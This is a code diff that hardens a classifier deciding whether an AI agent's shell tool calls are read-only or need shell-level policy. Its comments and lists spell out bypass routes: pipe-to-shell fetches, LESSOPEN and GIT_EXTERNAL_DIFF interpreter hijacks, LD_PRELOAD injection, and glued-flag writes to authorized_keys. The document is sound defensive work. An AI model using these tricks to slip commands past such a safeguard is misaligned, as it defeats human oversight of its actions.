@@ -35,6 +35,7 @@
  */
 import type { ToolCategory } from "../../tools/types.js";
 import { tokenizeShell, type ShellLeaf } from "../../main/shell-tokenizer.js";
+import { extractShellCommands } from "../../shared/shell-command-fields.js";
 import { hasNetworkTarget } from "./network-target.js";
 
 /**
@@ -48,7 +49,14 @@ import { hasNetworkTarget } from "./network-target.js";
  * be provably side-effect-free in their bare form.
  */
 const READ_ONLY_COMMANDS: ReadonlySet<string> = new Set([
-  "ls", "cat", "head", "tail", "less", "more", "pwd", "echo", "printf",
+  // NOTE: `less` and `more` are intentionally ABSENT. Both pagers hand control
+  // to a shell: `less` runs `LESSOPEN`/`LESSCLOSE` input preprocessors (the
+  // documented `|cmd %s` form pipes through an arbitrary program) and both
+  // expose an interactive `!cmd` escape. The interpreter is chosen by the
+  // environment, not by the argv the classifier can see, so there is no argv
+  // shape that proves a paging call is side-effect-free. Paging a file is
+  // `cat`'s job as far as this classifier is concerned.
+  "ls", "cat", "head", "tail", "pwd", "echo", "printf",
   "grep", "egrep", "fgrep", "rg", "ag", "find", "fd", "wc", "stat", "file",
   "du", "df", "tree", "which", "type", "whoami", "id", "hostname", "uname",
   "date", "env", "printenv", "uptime", "ps", "top", "sort", "uniq", "cut",
@@ -100,9 +108,13 @@ const MUTATING_FLAGS: ReadonlyMap<string, ReadonlySet<string> | null> = new Map(
   // `awk` is NOT listed here — it is not in READ_ONLY_COMMANDS (see above),
   // so hasMutatingFlag is never called for awk. Entry removed to avoid confusion.
   ["find", new Set(["-delete", "-exec", "-execdir", "-ok", "-okdir",
-                    "-fprint", "-fprintf", "-fls"])],
+                    "-fprint", "-fprint0", "-fprintf", "-fls"])],
   ["fd",   new Set(["-x", "--exec", "-X", "--exec-batch"])],
   ["sort", new Set(["-o", "--output"])],
+  // ripgrep executes an arbitrary preprocessor per file with `--pre` (and picks
+  // which files reach it with `--pre-glob`), and runs a binary for `--hostname-bin`.
+  // Searching is read-only; handing rg a program to run is not.
+  ["rg",   new Set(["--pre", "--pre-glob", "--hostname-bin"])],
   // Always-mutating (no side-effect-free bare form):
   ["tee",      null],  // always writes to every named file
   ["dd",       null],  // always reads/writes block devices or files
@@ -121,18 +133,109 @@ const MUTATING_FLAGS: ReadonlyMap<string, ReadonlySet<string> | null> = new Map(
 const MUTATING_SHORT_LETTERS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
   ["sed", new Set(["i"])],
   // `awk` removed — awk is not in READ_ONLY_COMMANDS, so this entry is dead.
+  // `sort -o` takes its output file as either a separate token (`-o out`) or
+  // glued to the flag (`-oout`, `-o/Users/x/.ssh/authorized_keys`). Exact-token
+  // matching only sees the first form, so the glued form wrote the file while
+  // classifying read. The cluster check covers both.
+  ["sort", new Set(["o"])],
 ]);
 
 /**
- * git subcommands that are unconditionally read-only (no mutation possible
- * regardless of flags). Subcommands that are read-only ONLY for certain flag
- * forms (`config`, `tag`, `branch`, `remote`) are NOT listed here — they are
- * handled by {@link isReadOnlyGitLeaf} which inspects the post-subcommand args.
+ * git subcommands whose INSPECTION is read-only. The subcommand alone is not a
+ * proof: `git diff --output=~/.ssh/authorized_keys` writes a file the operand
+ * scan never sees, and `--ext-diff`/`--textconv` hand the content to a
+ * config-selected program. So membership here only means "this subcommand has
+ * a read-only form"; every flag it carries must still clear
+ * {@link GIT_INSPECTION_READ_ONLY_FLAGS} (allow-list, unknown flag → shell).
+ * Subcommands that are read-only only for certain flag forms (`config`, `tag`,
+ * `branch`, `remote`) are NOT listed here — {@link GIT_READ_ONLY_FLAGS} scans
+ * ALL of their post-subcommand tokens, operands included.
  */
 const READ_ONLY_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
   "status", "log", "diff", "show", "rev-parse",
   "describe", "blame", "shortlog", "ls-files", "ls-tree", "cat-file",
   "for-each-ref", "reflog", "whatchanged",
+]);
+
+/**
+ * Long flags that keep an inspection subcommand read-only. ALLOW-LIST: a flag
+ * outside this set escalates to `"shell"` — the same default-strict discipline
+ * {@link GIT_READ_ONLY_FLAGS} applies to the ambiguous subcommands, extended to
+ * the ones previously waved through on the subcommand name alone.
+ *
+ * Deliberately excluded (each is a real write/exec reach, and this is why the
+ * list is an allow-list rather than a deny-list — the next one nobody thought
+ * of also escalates): `--output`, `-o`, `--ext-diff`, `--textconv`,
+ * `--output-indicator-*`, `-O<orderfile>`, `--upload-pack`, `--exec-path`,
+ * `--filter-spec`.
+ */
+const GIT_INSPECTION_READ_ONLY_FLAGS: ReadonlySet<string> = new Set([
+  // Output shaping
+  "--oneline", "--graph", "--stat", "--numstat", "--shortstat", "--summary",
+  "--name-only", "--name-status", "--raw", "--patch", "--no-patch",
+  "--patch-with-stat", "--compact-summary", "--dirstat", "--pretty", "--format",
+  "--abbrev", "--no-abbrev", "--abbrev-commit", "--no-abbrev-commit",
+  "--date", "--color", "--no-color", "--color-words", "--word-diff",
+  "--word-diff-regex", "--decorate", "--no-decorate", "--parents", "--children",
+  "--full-index", "--binary", "--unified", "--inter-hunk-context",
+  "--src-prefix", "--dst-prefix", "--no-prefix", "--default-prefix",
+  "--relative", "--no-relative", "--find-renames", "--find-copies",
+  "--find-copies-harder", "--no-renames", "--irreversible-delete",
+  "--diff-filter", "--diff-algorithm", "--histogram", "--patience", "--minimal",
+  "--ignore-all-space", "--ignore-space-change", "--ignore-space-at-eol",
+  "--ignore-blank-lines", "--ignore-cr-at-eol", "--ignore-submodules",
+  "--submodule", "--exit-code", "--quiet", "--stat-width", "--stat-name-width",
+  "--numbered-lines", "--line-porcelain", "--porcelain", "--short", "--long",
+  "--branch", "--show-stash", "--ahead-behind", "--no-ahead-behind",
+  "--untracked-files", "--ignored", "--column", "--no-column", "--null",
+  "--batch", "--batch-check", "--batch-all-objects", "--textconv-cache",
+  // Selection / traversal
+  "--all", "--branches", "--tags", "--remotes", "--glob", "--exclude",
+  "--max-count", "--skip", "--since", "--after", "--until", "--before",
+  "--author", "--committer", "--grep", "--grep-reflog", "--all-match",
+  "--invert-grep", "--regexp-ignore-case", "--basic-regexp",
+  "--extended-regexp", "--fixed-strings", "--perl-regexp",
+  "--merges", "--no-merges", "--min-parents", "--max-parents",
+  "--no-min-parents", "--no-max-parents", "--first-parent", "--follow",
+  "--reverse", "--topo-order", "--date-order", "--author-date-order",
+  "--ancestry-path", "--simplify-by-decoration", "--full-history",
+  "--sparse", "--dense", "--cherry-pick", "--left-right", "--boundary",
+  "--merge-base", "--cached", "--staged", "--merge", "--no-index",
+  "--find-object", "--pickaxe-all", "--pickaxe-regex",
+  "--reverse-blame", "--show-email", "--root", "--no-walk", "--do-walk",
+  "--cc", "--diff-merges", "--no-diff-merges", "--remerge-diff",
+  // rev-parse / ls-files / for-each-ref shapes
+  "--verify", "--symbolic", "--symbolic-full-name", "--abbrev-ref",
+  "--show-toplevel", "--show-cdup", "--show-prefix", "--git-dir",
+  "--git-common-dir", "--absolute-git-dir", "--is-inside-work-tree",
+  "--is-inside-git-dir", "--is-bare-repository", "--is-shallow-repository",
+  "--show-superproject-working-tree", "--sq", "--not", "--flags", "--no-flags",
+  "--revs-only", "--no-revs", "--default", "--prefix", "--end-of-options",
+  "--others", "--deleted", "--modified", "--stage", "--unmerged",
+  "--exclude-standard", "--directory", "--error-unmatch", "--full-name",
+  "--recurse-submodules", "--count", "--sort", "--contains", "--no-contains",
+  "--merged", "--no-merged", "--points-at", "--tags-only", "--refs",
+  "--type", "--objects", "--object-only", "--allow-unknown-type",
+  "--follow-symlinks", "--name-rev", "--always", "--dirty", "--broken",
+  "--committish", "--summary-only", "--numbered", "--email", "--group",
+  "--incremental", "--line-number", "--score-debug", "--show-name",
+  "--show-number", "--reverse-order", "--indent-heading",
+]);
+
+/**
+ * Short-flag letters that keep an inspection subcommand read-only, matched per
+ * letter so clusters (`-sn`) and glued values (`-U5`, `-M50%`) are covered.
+ * Same allow-list discipline: a letter outside this set escalates.
+ *
+ * `o` is deliberately absent — `-o` is `--output` for the diff family and
+ * `-O<orderfile>` reads a caller-named file.
+ */
+const GIT_INSPECTION_READ_ONLY_SHORT_LETTERS: ReadonlySet<string> = new Set([
+  // diff/log shaping: -p -u -s -U<n> -w -b -W -z -q -M -C -B -D -R -I
+  "p", "u", "s", "U", "w", "b", "W", "z", "q", "M", "C", "B", "D", "R", "I",
+  // log/blame selection: -n<n> -L -S -G -i -E -F -P -g -m -c -t -l -f -e -v -r -a
+  "n", "L", "S", "G", "i", "E", "F", "P", "g", "m", "c", "t", "l", "f", "e",
+  "v", "r", "a",
 ]);
 
 /**
@@ -171,8 +274,46 @@ const GIT_READ_ONLY_FLAGS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
   ["remote", new Set(["-v", "--verbose", "show", "get-url"])],
 ]);
 
-/** Argument selectors that commonly carry a shell command string. */
-const SHELL_COMMAND_FIELDS: readonly string[] = ["command", "cmd", "script", "shellCommand"];
+/**
+ * Environment assignments that choose WHAT the verb runs, rather than tuning
+ * how it runs. The tokenizer strips leading `NAME=value` words to expose the
+ * effective verb; for these names the stripped word IS the execution, so the
+ * verb scan alone is not evidence of anything:
+ *
+ *   LESSOPEN='|/bin/sh %s' less f     → less pipes the file through /bin/sh
+ *   GIT_EXTERNAL_DIFF=/bin/sh git diff → git execs /bin/sh per changed path
+ *
+ * Deny-list rather than allow-list, deliberately and narrowly: the ordinary
+ * `FOO=bar cmd` / `env LANG=C cmd` shape is the overwhelming majority and is
+ * genuinely inert, so an allow-list here would escalate almost every real call
+ * without a matching increase in safety. The escalation is instead keyed on the
+ * property that actually matters — the variable names a program consults to
+ * pick an interpreter, pager, editor, diff/merge driver, or preloaded library.
+ */
+const EXECUTION_SELECTING_ENV_NAMES: ReadonlySet<string> = new Set([
+  // Pagers / preprocessors
+  "LESSOPEN", "LESSCLOSE", "LESSEDIT", "LESSMETAECHO", "PAGER", "MANPAGER",
+  "GIT_PAGER", "SYSTEMD_PAGER",
+  // Editors (invoked as a program by many read-looking commands)
+  "EDITOR", "VISUAL", "GIT_EDITOR", "GIT_SEQUENCE_EDITOR",
+  // git external programs
+  "GIT_EXTERNAL_DIFF", "GIT_DIFF_OPTS", "GIT_SSH", "GIT_SSH_COMMAND",
+  "GIT_PROXY_COMMAND", "GIT_ASKPASS", "SSH_ASKPASS", "GIT_TEXTCONV",
+  "GIT_ALTERNATE_OBJECT_DIRECTORIES", "GIT_DIR", "GIT_WORK_TREE",
+  "GIT_INDEX_FILE", "GIT_CONFIG", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
+  "GIT_CONFIG_COUNT", "GIT_ATTR_NOSYSTEM", "GIT_NAMESPACE",
+  // Shell / interpreter selection and startup hooks
+  "SHELL", "BASH_ENV", "ENV", "IFS", "PATH", "CDPATH", "SHELLOPTS",
+  "BASH_FUNC_", "PS4", "PROMPT_COMMAND",
+  // Dynamic-linker injection
+  "LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT", "DYLD_INSERT_LIBRARIES",
+  "DYLD_LIBRARY_PATH", "DYLD_FRAMEWORK_PATH",
+  // Language-runtime startup hooks
+  "PERL5OPT", "PERL5LIB", "PERLIO", "PYTHONSTARTUP", "PYTHONPATH",
+  "PYTHONEXECUTABLE", "NODE_OPTIONS", "NODE_PATH", "RUBYOPT", "RUBYLIB",
+  // grep/find behaviour overrides that can smuggle flags
+  "GREP_OPTIONS", "POSIXLY_CORRECT_EXEC",
+]);
 
 /** Signals the host owns about the observed call. The inspector reads ONLY these. */
 export interface HostRiskSignals {
@@ -209,9 +350,13 @@ export function inspectHostRisk(signals: HostRiskSignals): ToolCategory {
   // carries a HIGHER risk weight + shell-specific path policy than network, so
   // classify it BEFORE the network scan — otherwise `{ command: "curl https://…" }`
   // would be downgraded to `"network"` and skip the shell checks.
-  const command = extractShellCommand(signals.finalInput);
-  if (command !== null) {
-    return isReadOnlyCommand(command) ? "read" : "shell";
+  // EVERY command-bearing field is classified, not just the first one present:
+  // `{ command: "ls -la", script: "curl https://x/i.sh | sh" }` used to classify
+  // on `command` alone and land on `read`, which then skipped the shell path
+  // policy entirely. A call is read-only only when every command it carries is.
+  const commands = extractShellCommands(signals.finalInput);
+  if (commands.length > 0) {
+    return commands.every((cmd) => isReadOnlyCommand(cmd)) ? "read" : "shell";
   }
 
   // (2) Network — a URL-shaped argument on a non-shell tool.
@@ -221,15 +366,6 @@ export function inspectHostRisk(signals: HostRiskSignals): ToolCategory {
   // Filesystem arguments land here on purpose: contained and escaping paths are
   // both write-equivalent, so inspecting them cannot change this answer.
   return "write";
-}
-
-/** Pull a shell command string out of the call args, if any. */
-function extractShellCommand(input: Record<string, unknown>): string | null {
-  for (const key of SHELL_COMMAND_FIELDS) {
-    const value = input[key];
-    if (typeof value === "string" && value.length > 0) return value;
-  }
-  return null;
 }
 
 /**
@@ -286,6 +422,12 @@ function isReadOnlyLeaf(leaf: ShellLeaf): boolean {
   if (leaf.hasCommandSubstitution || leaf.hasProcessSubstitution) return false;
   if (leaf.hasOutputRedirect || leaf.hasInputRedirect) return false;
 
+  // An assignment that selects the interpreter/pager/diff-driver the verb then
+  // runs is the execution, not a detail of it. The tokenizer strips assignments
+  // to expose the verb; discarding them silently is what let
+  // `LESSOPEN='|/bin/sh %s' less f` read as `less`.
+  if (leaf.assignments.some(selectsExecutionTarget)) return false;
+
   const argv = leaf.argv;
   if (argv.length === 0) {
     // The leaf was only assignments/wrappers. A bare read-only wrapper verb
@@ -308,6 +450,31 @@ function isReadOnlyLeaf(leaf: ShellLeaf): boolean {
 }
 
 /**
+ * True when a stripped `NAME=value` assignment picks the program a later verb
+ * will execute (see {@link EXECUTION_SELECTING_ENV_NAMES}).
+ *
+ * Two independent triggers, either one escalating:
+ *  1. The NAME is execution-selecting (exact match, or one of the `BASH_FUNC_x`
+ *     style prefixed families that export shell functions into the child).
+ *  2. The VALUE is shaped like a program invocation — a leading `|` (the
+ *     `LESSOPEN` pipe form) or an absolute/relative path to an interpreter.
+ *     This catches an execution-selecting variable this list has not learned
+ *     about yet, which is the failure mode a pure name list cannot cover.
+ */
+function selectsExecutionTarget(assignment: string): boolean {
+  const eq = assignment.indexOf("=");
+  if (eq <= 0) return false;
+  const name = assignment.slice(0, eq);
+  const value = assignment.slice(eq + 1);
+  if (EXECUTION_SELECTING_ENV_NAMES.has(name)) return true;
+  for (const prefixed of EXECUTION_SELECTING_ENV_NAMES) {
+    if (prefixed.endsWith("_") && name.startsWith(prefixed)) return true;
+  }
+  if (value.startsWith("|")) return true;
+  return /(?:^|[\s/])(?:ba|da|z|k|tc|c)?sh\b|(?:^|[\s/])(?:python[0-9.]*|perl|ruby|node|osascript|env)\b/.test(value);
+}
+
+/**
  * True when the git leaf (full argv, `argv[0] === "git"`) is read-only.
  *
  * Unconditionally-read subcommands pass immediately. Ambiguous subcommands
@@ -319,7 +486,13 @@ function isReadOnlyLeaf(leaf: ShellLeaf): boolean {
 function isReadOnlyGitLeaf(argv: readonly string[]): boolean {
   const sub = argv[1];
   if (typeof sub !== "string") return false;
-  if (READ_ONLY_GIT_SUBCOMMANDS.has(sub)) return true;
+  if (READ_ONLY_GIT_SUBCOMMANDS.has(sub)) {
+    // The subcommand name is not the whole answer: `git diff
+    // --output=~/.ssh/authorized_keys` writes, `git show --ext-diff` execs.
+    // Every FLAG must be in the read-only allow-list; non-flag tokens are
+    // revisions/pathspecs and are answered by path containment, not here.
+    return argv.slice(2).every(isReadOnlyGitInspectionToken);
+  }
   const readFlags = GIT_READ_ONLY_FLAGS.get(sub);
   if (readFlags === undefined) return false; // unlisted → shell
   // Every token after the subcommand must be in the read-only flag set.
@@ -327,6 +500,36 @@ function isReadOnlyGitLeaf(argv: readonly string[]): boolean {
   // read-only listing forms — allowed when postArgs is empty.
   const postArgs = argv.slice(2);
   return postArgs.every((t) => readFlags.has(t));
+}
+
+/**
+ * True when one post-subcommand token of an inspection subcommand keeps the
+ * leaf read-only. Allow-list: an unrecognised FLAG escalates.
+ *
+ * `--` ends option parsing, so everything after it is a pathspec — but the
+ * caller scans tokens independently and a bare `--` is itself inert, so it is
+ * simply accepted; a pathspec that happens to start with `-` after `--` is a
+ * false escalation (a prompt), never a false pass.
+ */
+function isReadOnlyGitInspectionToken(token: string): boolean {
+  if (!token.startsWith("-")) return true;   // revision / pathspec operand
+  if (token === "-" || token === "--") return true;
+  if (token.startsWith("--")) {
+    const eq = token.indexOf("=");
+    const name = eq > 0 ? token.slice(0, eq) : token;
+    return GIT_INSPECTION_READ_ONLY_FLAGS.has(name);
+  }
+  // `git log -5` — a bare count shortcut, no letters to check.
+  if (/^-[0-9]+$/.test(token)) return true;
+  // Short flags: every letter in the leading cluster must be allow-listed.
+  // A glued value (`-U5`, `-M50%`, `-Sneedle`) stops the cluster at the first
+  // non-letter, which is exactly the flag letters that were actually passed.
+  const cluster = /^-([A-Za-z]+)/.exec(token);
+  if (cluster === null) return false;
+  for (const letter of cluster[1]!) {
+    if (!GIT_INSPECTION_READ_ONLY_SHORT_LETTERS.has(letter)) return false;
+  }
+  return true;
 }
 
 /**
